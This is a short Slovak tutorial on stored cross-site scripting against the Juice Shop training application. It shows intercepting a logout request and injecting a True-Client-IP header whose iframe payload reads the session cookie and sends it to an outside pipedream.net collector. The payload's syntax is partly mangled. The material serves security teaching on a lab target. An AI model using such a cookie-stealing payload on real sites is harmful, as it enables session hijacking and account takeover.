# Stored cross site scripting (XSS)

- Stored cross site scripting (XSS) je nazývaný stored kvôli tomu, že škodlivý kód je ukladaný v databáze aplikácii a je spustený každý krát keď uživateľ navštívy danú stránku. Ukážeme si krátku ukážku na Juice shop aplikácii.
- Pre tento typ útoku budeme potrebovať taktiež nástroj, ktorý bude zachytávať HTTP požiadavky na server, čo nám umožnuje vidieť a upraviť každú jednu požiadavku. Zaužívaným nástrojom pre tieto potreby je PortSwigger.
- V Juice shop aplikácii máme samostatnú obrazovku, ktorá zobrazuje poslednú IP adresu z ktorej sme boli prihlásený. Táto posledná IP adresa sa získava z databázy. Pri odhlasovaní z účtu vieme odchytiť požiadavku na odhlásenie
            pomocou PortSwiggera a upraviť odosielanú IP adresu, ktorá sa ukladá do databázy. 
- Pri odchytení požiadavky pridáme do hlavičky requestu ešte jeden atribút True-Client-IP s hodnotout
        <pre>
            iframe src="javascript:const headers = new Headers();headers.append(‘Content-Type‘, ‘text/p-
            lain‘);const body = test: ‘event‘,;const options = method: ‘POST‘,headers,mode: ‘cors‘,body:
            document.cookie.split(‘ ‘)[4].split(‘=‘)[1],;fetch(‘https://eojph9o2kgja7k2.m.pipedream.net‘,
            options);" /iframe
        </pre>
              a požiadavku posunieme na server.
- Pri dalšom prihlasovaní sa pre obrazovku, kde zobrazujeme poslednú IP adresu prihlásenia, úž nezobrazí IP adresa ale náš kód, ktorý odošle požidavku na náš server so session tokenom.